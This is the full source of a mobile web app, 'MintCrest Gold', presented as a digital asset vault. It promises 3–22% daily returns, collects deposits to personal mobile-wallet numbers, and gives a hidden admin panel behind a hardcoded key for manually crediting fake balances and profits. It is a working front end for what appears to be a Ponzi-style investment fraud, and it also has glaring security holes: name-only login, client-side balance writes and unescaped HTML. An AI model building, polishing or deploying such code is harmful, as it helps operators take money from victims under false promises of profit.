<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | VIP Asset Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #000103; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.07); }
        .active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; background: linear-gradient(to top, rgba(59,130,246,0.1), transparent); }
        .page { display: none; animation: slideUp 0.3s ease; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .spin-anim { animation: rotate 2s cubic-bezier(0.1, 0.7, 0.1, 1) infinite; }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; white-space: nowrap; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div id="promo-ticker" class="hidden bg-blue-600/20 border-b border-blue-500/30 py-2 overflow-hidden z-[500]">
        <div class="animate-marquee text-[9px] font-black uppercase tracking-widest text-blue-400">
            📢 <span id="ticker-text">Welcome to MintCrest Gold - Secure Your Future Today!</span>
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000103] flex items-center justify-center p-8 text-center">
        <div class="w-full max-w-sm">
            <h1 onclick="adminTap()" class="text-5xl font-black italic mb-2 cursor-pointer uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <p class="text-gray-500 text-[8px] uppercase tracking-[0.4em] mb-12 font-bold italic">Official Digital Asset Vault</p>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-600 shadow-2xl">
                <input type="text" id="user-name" placeholder="Legal Full Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 text-white">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest shadow-2xl active:scale-95 transition-all">Secure Access</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3rem] mb-6 border-l-8 border-blue-600 shadow-xl">
                <p class="text-[9px] text-blue-400 font-extrabold mb-1 uppercase tracking-widest">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="mt-4 text-[9px] font-black text-yellow-500 uppercase italic">System Syncing...</div>
                <div class="mt-6 flex gap-3">
                    <span class="text-[8px] bg-green-500/10 text-green-400 px-4 py-2 rounded-full font-bold uppercase">Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[8px] bg-white/5 text-gray-400 px-4 py-2 rounded-full font-bold uppercase italic">No Active Fleet</span>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📥 <span class="text-[9px] font-black block mt-2 uppercase">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95">📤 <span class="text-[9px] font-black block mt-2 uppercase">Withdraw</span></button>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-6 uppercase text-blue-500 text-xl tracking-widest">Trading Fleet</h2>
            <div id="plans-list" class="grid grid-cols-1 gap-3 pb-10"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <h2 class="text-center font-black italic mb-8 uppercase text-blue-400">Security Ledger</h2>
            <div id="user-history" class="space-y-2 pb-10"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6 pb-12">
            <div class="glass p-8 rounded-[3rem] text-center border-t-4 border-yellow-500 shadow-2xl">
                <h3 class="text-yellow-500 font-black text-[12px] uppercase mb-4 italic tracking-widest">Lucky Spin Node</h3>
                <div id="wheel-container" class="relative w-32 h-32 mx-auto mb-6 flex items-center justify-center">
                    <div id="spin-visual" class="w-full h-full border-4 border-dashed border-yellow-500/20 rounded-full flex items-center justify-center text-4xl bg-white/5 transition-all duration-[3s]">🎡</div>
                </div>
                <button id="spin-btn" onclick="startSpin()" class="bg-yellow-600 px-10 py-3 rounded-2xl font-black text-[10px] uppercase shadow-lg disabled:opacity-20">Spin Wheel</button>
                <p id="spin-timer" class="mt-4 text-[8px] font-black text-gray-500 uppercase italic"></p>
            </div>

            <div class="glass p-8 rounded-[3rem] text-center border-b-4 border-green-500">
                <h3 class="text-green-500 font-black text-[10px] uppercase mb-4">Official Community</h3>
                <a href="https://chat.whatsapp.com/EbfTbr66JQLFEmjnxrReE3" class="inline-block bg-green-600 px-8 py-3 rounded-2xl font-black text-[9px] uppercase tracking-widest shadow-lg">💬 Join WhatsApp</a>
            </div>

            <div class="glass p-8 rounded-[3rem] border-l-4 border-blue-500">
                <h3 class="text-blue-500 font-black text-[11px] uppercase italic mb-4 underline">Firm Privacy Policy</h3>
                <div class="text-[8px] text-gray-400 space-y-3 font-bold uppercase italic leading-loose">
                    <p><span class="text-white">● WITHDRAWALS:</span> Processed within 2-24 hours. A 10% server maintenance fee is applied on all payouts.</p>
                    <p><span class="text-white">● MULTI-ACCOUNTING:</span> strictly prohibited. Detecting multiple sessions on one IP will lead to permanent ban.</p>
                    <p><span class="text-white">● INVESTMENT:</span> Capital is locked during the contract period. Profits are distributed every 24 hours.</p>
                </div>
            </div>

            <div class="glass p-8 rounded-[3rem]">
                <h3 class="text-blue-500 font-black text-[11px] uppercase mb-4 italic text-center">Admin Help Desk</h3>
                <textarea id="support-msg" placeholder="Describe your issue..." class="w-full bg-white/5 p-5 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 h-20 font-bold text-white"></textarea>
                <button onclick="sendSupport()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-[10px] uppercase">Send Message</button>
            </div>

            <div class="glass p-8 rounded-[3rem] text-center">
                <p class="text-[8px] font-bold text-gray-500 mb-4 uppercase italic">Referral Link</p>
                <input type="text" id="ref-link" readonly class="w-full bg-white/5 p-4 rounded-2xl text-[10px] text-center font-bold mb-4 border border-white/5 outline-none">
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-3 rounded-2xl font-black text-[9px] uppercase">Copy Invite</button>
            </div>

            <button onclick="logout()" class="w-full glass p-6 rounded-[2.5rem] text-center text-[10px] font-black text-red-500 uppercase">Terminate Session</button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] text-center border-t-8 border-blue-600 shadow-2xl">
                <h3 class="font-black text-blue-500 mb-8 uppercase text-sm italic tracking-widest">Capital Funding</h3>
                <div class="space-y-3 mb-10 text-[10px] font-black uppercase text-left">
                    <div class="glass p-4 rounded-xl flex justify-between"><span>JazzCash/Sadapay</span><span>03705519562</span></div>
                    <div class="glass p-4 rounded-xl flex justify-between"><span>Easypaisa</span><span>03379827882</span></div>
                </div>
                
                <input type="number" id="dep-amount" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/10 text-white">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold uppercase outline-none border border-white/10 text-white">
                
                <input type="text" id="dep-promo" placeholder="PROMO CODE (IF ANY)" class="w-full bg-blue-500/10 p-4 rounded-2xl mb-6 text-center text-[9px] font-black uppercase outline-none border border-blue-500/20 text-blue-400">

                <label class="block w-full bg-white/5 p-5 rounded-2xl mb-8 border border-dashed border-white/20 cursor-pointer">
                    <span id="file-label" class="text-[9px] font-bold opacity-50 uppercase italic text-white">📸 Upload Screenshot Proof</span>
                    <input type="file" id="dep-proof" accept="image/*" class="hidden" onchange="document.getElementById('file-label').innerText = 'Screenshot Ready ✅'">
                </label>

                <button id="dep-btn" onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Verify Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-10 rounded-[3.5rem] border-t-8 border-red-600 text-center shadow-2xl">
                <h3 class="font-black text-red-500 mb-8 uppercase text-sm italic">Request Payout</h3>
                <input type="number" id="wd-amt" placeholder="Amount (PKR)" class="w-full bg-white/5 p-5 rounded-2xl mb-3 text-center font-bold outline-none border border-white/10 text-white">
                <input type="text" id="wd-acc" placeholder="Account Name & Number" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center text-[9px] font-bold outline-none border border-white/10 text-white">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-2xl font-black text-[10px] uppercase shadow-lg">Authorize Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000103] z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10">
            <h2 class="text-xl font-black text-blue-500 uppercase italic underline decoration-4">Master Console</h2>
            <button onclick="closeAdmin()" class="bg-red-600 text-white px-6 py-2 rounded-xl text-[10px] font-black">EXIT</button>
        </div>
        
        <div class="flex gap-2 mb-8 overflow-x-auto">
            <button onclick="showAdmTab('requests')" class="bg-blue-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Orders/Msgs</button>
            <button onclick="showAdmTab('users')" class="glass px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Users</button>
            <button onclick="showAdmTab('broadcast')" class="bg-yellow-600 px-6 py-2 rounded-xl text-[9px] font-black uppercase whitespace-nowrap">Broadcast</button>
        </div>

        <div id="adm-sec-requests" class="adm-tab space-y-3"></div>
        <div id="adm-sec-users" class="adm-tab hidden space-y-3"></div>
        <div id="adm-sec-broadcast" class="adm-tab hidden glass p-8 rounded-[3rem]">
            <textarea id="bc-msg" placeholder="Write Promo Ticker..." class="w-full bg-white/5 p-5 rounded-2xl text-[10px] border border-white/10 outline-none mb-4 h-24 font-bold text-white"></textarea>
            <button onclick="sendBroadcast()" class="w-full bg-yellow-600 py-4 rounded-2xl font-black text-[10px] uppercase">🚀 Broadcast Now</button>
        </div>

        <div class="glass p-8 rounded-[3rem] mt-10">
            <h3 class="text-[9px] font-black uppercase mb-4 opacity-50 text-center tracking-widest italic">Manual Fund Injection</h3>
            <input type="text" id="adm-user" placeholder="User Name" class="w-full bg-white/5 p-4 rounded-xl mb-2 text-center text-[10px] font-bold border border-white/5 outline-none text-white">
            <input type="number" id="adm-val" placeholder="Amount (PKR)" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center text-[10px] font-bold border border-white/5 outline-none text-white">
            <div class="grid grid-cols-2 gap-2">
                <button onclick="manualEdit('balance')" class="bg-blue-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Bal</button>
                <button onclick="manualEdit('profit')" class="bg-green-600 py-3 rounded-xl font-black text-[9px] uppercase">Add Prof</button>
            </div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/5 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem] shadow-2xl">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab">🏠<span class="text-[8px] font-black uppercase mt-1">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2">📈<span class="text-[8px] font-black uppercase mt-1">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2">📜<span class="text-[8px] font-black uppercase mt-1">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2">🏢<span class="text-[8px] font-black uppercase mt-1">Firm</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [
            { n: "Micro-Elite I", p: 200, r: 3, d: 30 }, { n: "Micro-Elite II", p: 500, r: 3.2, d: 30 },
            { n: "Bronze-S", p: 1000, r: 3.5, d: 30 }, { n: "Bronze-X", p: 2000, r: 3.8, d: 30 },
            { n: "Silver-S", p: 3000, r: 4.2, d: 30 }, { n: "Silver-X", p: 5000, r: 4.5, d: 30 },
            { n: "Gold-S", p: 7000, r: 5, d: 30 }, { n: "Gold-X", p: 10000, r: 5.5, d: 30 },
            { n: "Gold-Master", p: 15000, r: 6, d: 30 }, { n: "Platinum-S", p: 20000, r: 6.5, d: 30 },
            { n: "Platinum-X", p: 30000, r: 7, d: 30 }, { n: "Diamond-S", p: 40000, r: 7.5, d: 30 },
            { n: "Diamond-X", p: 50000, r: 8, d: 30 }, { n: "Royal-S", p: 75000, r: 9, d: 30 },
            { n: "Royal-Grand", p: 100000, r: 10, d: 30 },
            { n: "⚡ FLASH 24H", p: 500, r: 12, s: true }, { n: "⭐ VIP ACCESS", p: 2500, r: 14, s: true },
            { n: "💎 ELITE PASS", p: 8000, r: 15, s: true }, { n: "🚀 ROCKET PRO", p: 12000, r: 18, s: true },
            { n: "👑 CROWN KING", p: 25000, r: 22, s: true }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mc_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000); 
            listenForPromos();
        };

        function listenForPromos() {
            db.collection("app_data").doc("announcement").onSnapshot(doc => {
                if(doc.exists) {
                    document.getElementById('promo-ticker').classList.remove('hidden');
                    document.getElementById('ticker-text').innerText = doc.data().message;
                }
            });
        }

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase(); if(!name) return;
            localStorage.setItem('mc_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierName: "Inactive", lastSpin: 0 });
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = window.location.origin + window.location.pathname + "?ref=" + name;
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { if(doc.exists) { user = doc.data(); updateUI(); checkProfitReq(user); } });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => { list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center mb-2 text-[9px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px]">${new Date(d.time).toLocaleString()}</span></div><div class="text-right">₨ ${d.amount}<br><span class="text-blue-400">${d.status}</span></div></div>`; });
            });
        }

        function updateUI() {
            document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
            document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
            document.getElementById('tier-tag').innerText = user.tierName;
            const diff = Date.now() - (user.lastSpin || 0);
            const btn = document.getElementById('spin-btn');
            if(diff < 86400000) { btn.disabled = true; document.getElementById('spin-timer').innerText = "LOCKED: " + Math.ceil((86400000-diff)/3600000) + "H"; }
            else { btn.disabled = false; document.getElementById('spin-timer').innerText = "NODE READY"; }
        }

        async function startSpin() {
            const win = [10, 20, 50, 0, 100, 5, 0][Math.floor(Math.random()*7)];
            const wheel = document.getElementById('spin-visual'); wheel.classList.add('spin-anim');
            setTimeout(async () => {
                wheel.classList.remove('spin-anim'); wheel.innerText = "₨ " + win;
                if(win > 0) await db.collection("requests").add({ user: user.name, amount: win, type: "Spin Bonus", status: "pending", time: Date.now() });
                await db.collection("users").doc(user.name).update({ lastSpin: Date.now() });
                alert(win > 0 ? "Bonus Recorded! Wait for approval." : "No win this time!");
            }, 3000);
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => {
                const style = p.s ? 'border: 1px solid rgba(59,130,246,0.3) !important; background: rgba(59,130,246,0.05);' : '';
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-5 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-2" style="${style}"><div><h4 class="font-black text-[10px] uppercase text-gray-400">${p.n}</h4><p class="text-[8px] text-green-400 font-bold uppercase">${p.r}% Daily</p></div><div class="text-right"><p class="font-black text-[12px]">₨ ${p.p.toLocaleString()}</p></div></div>`;
            });
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value, t = document.getElementById('dep-trx').value, p = document.getElementById('dep-promo').value, f = document.getElementById('dep-proof');
            if(!a || !t || !f.files[0]) return alert("Enter Details & Screenshot!");
            const r = new FileReader(); r.readAsDataURL(f.files[0]); r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, promo: p||"None", proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Request Logged!"); changePage('activity');
            };
        }

        async function buy(p, roi, tName) {
            if(user.balance < p) { alert("Low Funds!"); changePage('wallet'); }
            else { if(confirm("Activate "+tName+"?")) { await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tName, lastReqTime: Date.now() }); alert("Success!"); } }
        }

        async function submitWithdraw() {
            const a = document.getElementById('wd-amt').value, acc = document.getElementById('wd-acc').value; if(!a || !acc || parseInt(a) > user.balance) return alert("Invalid Balance!");
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), acc: acc, type: "withdraw", status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) }); alert("Requested!"); changePage('activity');
        }

        async function checkProfitReq(u) { if (u.activeTier > 0 && (Date.now() - u.lastReqTime) >= 86400000) { const amt = (u.activeTier * u.tierROI) / 100; await db.collection("requests").add({ user: u.name, amount: amt, type: "Daily Profit", status: "pending", time: Date.now() }); await db.collection("users").doc(u.name).update({ lastReqTime: Date.now() }); } }
        function updateCountdown() { if (user && user.activeTier > 0) { const d = (user.lastReqTime + 86400000) - Date.now(); if(d>0) { const h = Math.floor(d/3600000), m = Math.floor((d%3600000)/60000), s = Math.floor((d%60000)/1000); document.getElementById('countdown-display').innerText = `YIELD IN: ${h}H ${m}M ${s}S`; } else { document.getElementById('countdown-display').innerText = "YIELD READY"; } } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE"; } }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); document.getElementById('n-'+p)?.classList.add('active-tab'); }
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Key:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        function showAdmTab(t) { document.querySelectorAll('.adm-tab').forEach(s=>s.classList.add('hidden')); document.getElementById('adm-sec-'+t).classList.remove('hidden'); }
        async function sendBroadcast() { const m = document.getElementById('bc-msg').value; await db.collection("app_data").doc("announcement").set({ message: m, time: Date.now() }); alert("Broadcasted!"); }
        async function sendSupport() { const m = document.getElementById('support-msg').value; await db.collection("requests").add({ user: user.name, message: m, type: "Support", status: "pending", time: Date.now(), amount: 0 }); alert("Ticket Sent!"); }

        async function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = '';
                snap.forEach(doc => { const d = doc.data(); 
                    const pBtn = d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' />')">📸</button>` : '';
                    list.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between items-center text-[8px] font-black uppercase"><div>${d.user}<br>Rs ${d.amount} (${d.type})<br>P: ${d.promo||'No'}</div><div class="flex gap-2">${pBtn}<button onclick="handle('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-2 rounded">OK</button></div></div>`;
                });
            });
            db.collection("users").onSnapshot(snap => { const list = document.getElementById('adm-sec-users'); list.innerHTML = ''; snap.forEach(doc => { const u = doc.data(); list.innerHTML += `<div class="glass p-4 flex justify-between text-[8px] uppercase font-bold"><span>${u.name}</span><span>Rs ${u.balance}</span></div>`; }); });
        }
        async function handle(id, u, amt, act, type) { const ref = db.collection("users").doc(u); const doc = await ref.get(); if(act==='approved' && (type==='deposit'||type.includes('Profit')||type==='Spin Bonus')) await ref.update({ balance: (doc.data().balance||0)+amt }); await db.collection("requests").doc(id).update({ status: act }); }
        async function manualEdit(f) { const u = document.getElementById('adm-user').value.toUpperCase(), v = parseInt(document.getElementById('adm-val').value), ref = db.collection("users").doc(u), d = await ref.get(); if(d.exists) await ref.update({ [f]: (d.data()[f]||0)+v }); alert("Done!"); }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Copied!"); }
    </script>
</body>
</html>
